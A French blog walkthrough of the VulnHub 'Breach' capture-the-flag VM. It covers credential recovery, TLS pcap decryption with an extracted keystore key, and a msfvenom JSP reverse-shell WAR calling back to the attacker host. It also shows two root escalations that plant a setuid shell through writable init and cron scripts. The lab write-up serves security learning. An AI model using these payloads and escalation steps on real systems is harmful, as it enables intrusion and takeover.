# Solution du CTF Breach de VulnHub

## VM Setup

Pour une fois la VM n'est pas tout à fait plug-and-play. Celle-ci n'est pas configurée pour obtenir son adresse IP via DHCP mais utilise une adresse statique `192.168.110.140`.

Ca semblait facile d'aller rajouter directement une interface host only dans l'interface de VirtualBox mais *Surprise!* on se fait jeter avec un message d'erreur enigmatique.

Un post stack-overflow plus tard on découvre qu'il faut désormais éditer un fichier de configuration qui sert de whitelist à VirtualBox, je pense qu'ils se sont dit que c'était problématique qu'un utilisateur autre que root puisse configurer des interfaces réseau...

J'ai donc ouvert le fichier `/etc/vbox/networks.conf` et ajouté une page IPv4 et une plage IPv6 qui définissent ce que VirtualBox a le droit d'utiliser :

```
* 192.168.0.0/16
* 2001::/64
```

Après on peut rajouter notre interface de façon classique :

![Breach VM Host Only setup](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/breach_vm_setup.png)

## VM Fix

A un moment dans le CTF vous avez affaire à un Tomcat utilisant du SSL... Oui mais lequel ? SSLv3 et ce avec un algorithme spécifique qui a depuis été rayé de tous les navigateurs et autres librairies (openssl ne vous laisse même pas vous y connecter).

Par conséquent impossible d'accéder à ce service qui est une partie vitale du CTF.

On va donc devoir éditer un fichier de configuration de Tomcat pour lui indiquer d'utiliser des settings un poil plus moderne.

Quand la VM démarre et que vous parvenez aux options de démarrage (Ubuntu, Ubuntu advanced, recovery)  appuyez sur la touche `e` du clavier qui vous fera entrer dans la configuration GRUB.

Descendez sur l'avant dernière ligne qui doit commencer par `linux`.

Effacez tout à partir de `ro` inclus et placez à la place `rw init=/bin/sh`

Appuyez sur la touche F10, le système va démarrer et vous donner votre shell root.

De là éditez `/etc/tomcat6/server.xml` et recherchez la ligne avec `SSLEnabled` et changez là pour quelle ressemble à ceci :

```xml
   <Connector SSLEnabled="true" acceptCount="100" clientAuth="false"
disableUploadTimeout="true" enableLookups="false" maxThreads="25"
port="8443" keystoreFile="/home/milton/.keystore" keystorePass="tomcat"
protocol="org.apache.coyote.http11.Http11NioProtocol" scheme="https"
secure="true" sslProtocol="TLS" />
```

Redémarrez, la VM devrait marche normalement.

## Scénario

La description du CTF [Breach](https://vulnhub.com/entry/breach-1,152/) vient avec une petite histoire sur la page d'accueil :

> Initech was breached and the board of directors voted to bring in their internal Initech Cyber Consulting, LLP division to assist. Given the high profile nature of the breach and nearly catastrophic losses, there have been many subsequent attempts against the company. Initech has tasked their TOP consultants, led by Bill Lumbergh, CISSP and Peter Gibbons, C|EH, SEC+, NET+, A+ to contain and perform analysis on the breach.
> 
> Little did the company realize that the breach was not the work of skilled hackers, but a parting gift from a disgruntled former employee on his way out. The TOP consultants have been hard at work containing the breach. However, their own work ethics and the mess left behind may be the company's downfall.

Un scan de port semblera interminable et, s'il arrive à ses fins, vous indiquera qu'un tas de ports sont ouverts. Ca sent fort le pot de miel !

On s'en tient donc au port 80 et dans le code source de la page on remarque le commentaire suivant :

```html
<!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo ----->
```

On double-decode ça en base64 en on obtient des identifiants : `pgibbons:damnitfeel$goodtobeagang$ta`

On trouve aussi des liens dans la page web et l'un deux pointe vers le path `/impresscms/user.php`. Je ne suis pas parvenu à trouver la version exacte de ce CMS, au plus on a le pied de page qui indique `Powered by ImpressCMS © 2007-2016`.

Les identifiants trouvés préalablement permetten de se connecter sur le CMS mais on obtient une page blanche. Un reload suffit à régler le problème mais le fonctionnement du site semble assez chaotique.

## Une clé dans un certificat dans un keystore dans un email

L'utilisateur a 3 messages dans la messagerie dont 2 qui mentionnent SSL :

> ---
> 
> **FWD: Thank you for your purchase of Super Secret Cert Pro!**  
> 
> Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!



>  **SSL implementation test capture**
> 
> Published by [Peter Gibbons](http://192.168.110.140/impresscms/modules/content/index.php?uid=2) on 2016/6/4 21:37:05. (0 reads)
> 
> Team - I have uploaded a pcap file of our red team's re-production of the attack. I am not sure what trickery they were using but I cannot read the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. http://192.168.110.140/impresscms/_SSL_test_phase1.pcap They told me the alias, storepassword and keypassword are all set to 'tomcat'. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I'm going fishing for the next 2 days and will not have access to email or phone.

On se retrouve donc avec deux fichiers. L'un est un KeyStore Java d'après l'utilitaire `file` et le second est bien sûr un enregistrement réseau au format PCAP.

On est censé pouvoir afficher les secrets présents dans le keystore de cette façon :

```bash
keytool -list -keystore .keystore -v
```

mais un mot de passe est demandé. Bien sûr il y a un script John The Ripper pour ça :

```bash
python keystore2john.py /tmp/.keystore
```

Ce qui permet de casser le mot de passe qui est `tomcat` mais ça on le savait via l'un des messages. Avec celui ci on peut lister le contenu du keystore :

```
Votre fichier de clés d'accès contient 1 entrée

Nom d'alias : tomcat
Date de création : 20 mai 2016
Type d'entrée : PrivateKeyEntry
Longueur de chaîne du certificat : 1
```

Ca devient plus tricky, comme souvent avec les certificats. Ce dernier est en JKS et il faut le convertir en PKCS12.

J'ai trouvé cette commande sur StackOverflow, j'ai rattaché le même mot de passe sur le niveau keystore :

```bash
keytool -importkeystore \
  -srckeystore .keystore \
  -destkeystore keystore.p12 \
  -deststoretype PKCS12 \
  -srcalias tomcat \
  -deststorepass tomcat \
  -destkeypass tomcat
```

Maintenant qu'on a le certificat au format p12 il faut encore en extraire la clé privée :

```bash
openssl pkcs12 -in keystore.p12 -nodes -nocerts -out key.pem
```

Le fichier pem obtenu contient bien ce que l'on cherchait :

```
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
pHiPhbocjixKJz9xx+pG0jDkrg==
-----END PRIVATE KEY-----
```

## Jerry la souris

On peut ouvrir la capture réseau dans Wireshark, aller des `Préférences > Protocols > TLS` et ajouter la clé privée. Les données chiffrées apparaissent automatiquement en clair. On y voit notemment des requêtes HTTP à destination d'un Tomcat dont l'URL a été personnalisée :

```http
GET /_M@nag3Me/html HTTP/1.1
Host: 192.168.110.140:8443

HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm="Tomcat Manager Application"
Set-Cookie: JSESSIONID=D47711065D862B1E44A4868B0C8E5480; Path=/_M%40nag3Me; Secure
```

La deuxième requête est authentifiée avec l'envoit d'une authorisation HTTP basic :

```http
GET /_M@nag3Me/html HTTP/1.1
Host: 192.168.110.140:8443
Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
```

C'est bien sûr di base64 qui se décode en :

`tomcat:Tt\5D8F(#!*u=G)4m7zB`

Et une dernière requête semble correspondre à un webshell JSP :

```http
GET /cmd/cmd.jsp?cmd=id HTTP/1.1
Host: 192.168.110.140:8443

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: text/html

<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
```

Si vous avez bien reconfiguré le Tomcat pour qu'il prenne du TLS alors y accéder avec les identifiants ne devrait pas poser de problèmes.

J'ai tenté de réutiliser la même backdoor WAR que la dernière fois :

[GitHub - p0dalirius/Tomcat-webshell-application: A webshell application and interactive shell for pentesting Apache Tomcat servers.](https://github.com/p0dalirius/Tomcat-webshell-application)

Mais ça ne semblait pas fonctionner, peut être parce que la version de Tomcat est assez ancienne. Finament j'ai créé le WAR avec `msfvenom` :

```bash
msfvenom --payload java/jsp_shell_reverse_tcp -f war LHOST=192.168.110.1 LPORT=9999 -o backdoor.war
```

On met un ncat en écoute et on charge l'URL où le war s'est déployé (une fois uploadé via l'interface web de Tomcat) :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.110.140.
Ncat: Connection from 192.168.110.140:49278.
id
uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
```

Il y a deux utilisateurs. L'un s'appelle `Milton` (tout le CTF s'inspire du film [35 heures, c'est déjà trop](https://fr.wikipedia.org/wiki/35_heures,_c%27est_d%C3%A9j%C3%A0_trop). Il a une copie du keystore que l'on connait déjà ainsi qu'un script world-writable mais ce dernier contient du texte (pas de commandes bash) sans importance.

```shellsession
tomcat6@Breach:/tmp$ ls -al /home/milton
total 156
drwxr-xr-x 3 milton milton   4096 Jun  6  2016 .
drwxr-xr-x 4 root   root     4096 Jun  4  2016 ..
-rw------- 1 milton milton    234 Jun 11  2016 .bash_history
-rw-r--r-- 1 milton milton    220 May 20  2016 .bash_logout
-rw-r--r-- 1 milton milton   3637 May 20  2016 .bashrc
drwx------ 2 milton milton   4096 May 20  2016 .cache
-rw-rw-r-- 1 milton milton   2245 May 20  2016 .keystore
-rw------- 1 milton milton    407 Jun  4  2016 .mysql_history
-rw-r--r-- 1 milton milton    675 May 20  2016 .profile
-rw-r--r-- 1 root   root       66 Jun  4  2016 .selected_editor
-rw-rw-r-- 1 milton milton 111255 Jun  4  2016 my_badge.jpg
-rwxrwxrwx 1 milton milton    755 Jun  4  2016 some_script.sh
```

Je remarque dans les processus le programme a l'origine du grand nombre de ports que Nmap a détecté :

`daemon     988  0.0  1.8 121688 18440 ?        Ssl  09:33   0:00 /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D`

Mais si on utilise `ss` on remarque seulement 4 ports en écoute sur le système. En fait il y a un script d'init (dont je parle plus bas) qui redirige tout un cas de ports avec `iptables` sur le port en écoute de *portspoof*.

Ce qu'il faut prendre en considération c'est que MySQL écoute bien sur son port standard et via un fichier de configuration PHP présent sur le système on retrouve les identifiants (`root` sans mot de passe).

```sql
mysql> select User, Password from mysql.user;
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| root             |                                           |
| milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          |
| root             |                                           |
| root             |                                           |
| debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 |
+------------------+-------------------------------------------+
5 rows in set (0.01 sec)
```

C'est intéressant cet utilisateur `milton` sur MySQL, surtout qu'une recherche récursive sur la racine web ne retourne aucun match. Il n'est certainement pas là pour décorer.

Je balance le hash sur crackstation.net et j'obtiens le  mot de passe `thelaststraw`.

Il permet de devenir `milton` via `su`. L'utilisateur fait partie du groupe adm qui est capable d'aller lire le contenu des logs.

Ainsi dans `/var/log/auth.log.1` je trouve plusieurs références au script `/usr/share/cleanup/tidyup.sh` que voici :

```bash
#!/bin/bash

#Hacker Evasion Script 
#Initech Cyber Consulting, LLC
#Peter Gibbons and Michael Bolton - 2016
#This script is set to run every 3 minutes as an additional defense measure against hackers.

cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf
```

J'ai uploadé et exécuté [pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy) et ce script est exécuté régulièrement, vraisemblablement via la `crontab` de root.

Le dossier mentionné dans la commande est word-writable :

`drwxrwxrwx 2 tomcat6 tomcat6 4096 Nov  9 11:00 /var/lib/tomcat6/webapps/swingline`

J'ai fait quelques tests en local et il semble qu'on peut exploiter le xargs en plaçant des fichiers dont les noms seront interprétés comme option à la commande appelée.

Malheureusement ici il s'agit de  `rm` et je n'ai pas vu de scénario d'attaque possible.

En cherchant les fichiers modifiables apartenant à `root` j'ai trouvé un script dans `init.d` :

```shellsession
milton@Breach:~$ find / -type f -user root -writable 2> /dev/null  | grep -v /proc | grep -v /sys
/etc/init.d/portly.sh
```

L'inconvénient c'est qu'il faut bien sûr redémarrer la VM après modification ce qui ne serait pas très réaliste dans la réalité.

```bash
echo "cp /bin/sh /tmp/rootshell; chmod 4755 /tmp/rootshell" >> portly.sh
```

On reboot, on relance notre webshell Tomcat et on trouve bien le binaire setuid qu'on a demandé :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.110.140.
Ncat: Connection from 192.168.110.140:44896.
ls -al /tmp
total 144
drwxrwxrwt  6 root    root      4096 Nov  9 12:22 .
drwxr-xr-x 22 root    root      4096 Nov  9 09:32 ..
-rwsr-xr-x  1 root    root    121272 Nov  9 12:21 gotroot
drwxr-xr-x  2 tomcat6 tomcat6   4096 Nov  9 12:19 hsperfdata_tomcat6
drwxrwxrwt  2 root    root      4096 Nov  9 12:19 .ICE-unix
drwxr-xr-x  2 tomcat6 root      4096 Nov  9 12:19 tomcat6-tomcat6-tmp
drwxrwxrwt  2 root    root      4096 Nov  9 12:19 .X11-unix
python3 -c 'import pty; pty.spawn("/bin/sh")'
$ /tmp/gotroot
/tmp/gotroot
# id
id
uid=104(tomcat6) gid=112(tomcat6) euid=0(root) groups=0(root),112(tomcat6)
# cd /root
cd /root
# ls -al
ls -al
total 60
drwx------  4 root root  4096 Jun 12  2016 .
drwxr-xr-x 22 root root  4096 Nov  9 09:32 ..
-rw-------  1 root root   115 Jun 12  2016 .bash_history
-rw-r--r--  1 root root  3106 Feb 19  2014 .bashrc
drwx------  2 root root  4096 Jun  6  2016 .cache
-rw-r--r--  1 root root   840 Jun 11  2016 .flag.txt
-rw-r--r--  1 root root 23792 Jun  4  2016 flair.jpg
-rw-r--r--  1 root root   140 Feb 19  2014 .profile
drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb
-rw-r--r--  1 root root    66 Jun  4  2016 .selected_editor
# cat .flag.txt
cat .flag.txt
-----------------------------------------------------------------------------------

______                     _     __   _____      _____ _          _____          _ 
| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |
| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |
| ___ \ '__/ _ \/ _` |/ __| '_ \ | | |  /| |______| | | '_ \ / _ \  __| '_ \ / _` |
| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|


-----------------------------------------------------------------------------------
Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!

Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.
```

## Commedia dell'arte

Il y a une fin alternative pour ce challenge qui s'oriente plus vers du Jeopardy (et du guessing). Ainsi sous la racine web se trouvait un dossier avec des images :

```
milton@Breach:/var/www/html/images$ ls -l
total 912
-rw-rw-r-- 1 www-data www-data 322874 Jun  4  2016 bill.png
-rwxrwxrwx 1 www-data www-data  48483 Jun  6  2016 cake.jpg
-rw-r--r-- 1 www-data www-data 127397 Jun  5  2016 initech.jpg
-rwxrwxrwx 1 www-data www-data  33581 Jun  4  2016 milton_beach.jpg
-rwxrwxrwx 1 www-data www-data  27963 Jun  6  2016 swingline.jpg
-rwxrwxrwx 1 www-data www-data 362600 Jun  9  2016 troll.gif
```

L'une d'elle contient un commentaire dans les données EXIF qui correspond à un mot de passe :

```shellsession
$ exiftool bill.png 
ExifTool Version Number         : 12.45
File Name                       : bill.png
Directory                       : .
File Size                       : 323 kB
File Modification Date/Time     : 2022:11:09 16:59:30+01:00
File Access Date/Time           : 2022:11:09 17:00:27+01:00
File Inode Change Date/Time     : 2022:11:09 16:59:30+01:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 610
Image Height                    : 327
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Comment                         : coffeestains
Image Size                      : 610x327
Megapixels                      : 0.199
```

Il permet de se connecter avec l'utilisateur `blumbergh`. Ce dernier dispose d'une autorisation spéciale pour faire un `tee` sur la tache planifiée de root que l'on a vu plus tôt.

```shellsession
milton@Breach:~$ su blumbergh 
Password: 
blumbergh@Breach:/home/milton$ sudo -l
Matching Defaults entries for blumbergh on Breach:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on Breach:
    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
```

`tee` est un programme que j'utilise souvent avec `LinPEAS`. Il permet de ré-afficher l'output qu'il reçoit tout en l'écrivant en même temps dans un fichier.

Comme `LinPEAS` génère beaucoup d'information, le coupler avec `tee` me permet de voir l'output et fur et à mesure de l'exécution mais aussi de pouvoir lire les données deluis le fichier créé quand je le souhaite.

Ici je vais appeler directement `tee` sans pipe et taper le script que je veut sur l'entrée standard. Du au fonctionnement du programme, les données sont aussitôt affichées. C'est pour cela qu'elles apparaissen deux fois ici (mais dans le fichier elle n'y seront qu'une fois) :

```shellsession
blumbergh@Breach:/home/milton$ sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
#!/bin/sh
#!/bin/sh
cp /bin/sh /tmp/gotroot
cp /bin/sh /tmp/gotroot
chmod 4755 /tmp/gotroot
chmod 4755 /tmp/gotroot
blumbergh@Breach:/home/milton$ ls -l /tmp/gotroot 
-rwsr-xr-x 1 root root 121272 Nov  9 12:12 /tmp/gotroot
blumbergh@Breach:/home/milton$ /tmp/gotroot
# id
uid=1001(blumbergh) gid=1001(blumbergh) euid=0(root) groups=0(root),1001(blumbergh)
# cd /root
# ls -al
total 60
drwx------  4 root root  4096 Jun 12  2016 .
drwxr-xr-x 22 root root  4096 Nov  9 09:32 ..
-rw-------  1 root root   115 Jun 12  2016 .bash_history
-rw-r--r--  1 root root  3106 Feb 19  2014 .bashrc
drwx------  2 root root  4096 Jun  6  2016 .cache
-rw-r--r--  1 root root   840 Jun 11  2016 .flag.txt
-rw-r--r--  1 root root 23792 Jun  4  2016 flair.jpg
-rw-r--r--  1 root root   140 Feb 19  2014 .profile
drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb
-rw-r--r--  1 root root    66 Jun  4  2016 .selected_editor
# cat .flag.txt
-----------------------------------------------------------------------------------

______                     _     __   _____      _____ _          _____          _ 
| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |
| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |
| ___ \ '__/ _ \/ _` |/ __| '_ \ | | |  /| |______| | | '_ \ / _ \  __| '_ \ / _` |
| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|


-----------------------------------------------------------------------------------
Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!

Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.
```

Voici un CTF plutôt intéressant même si je reste partagée sur les techniques d'obtention du root.
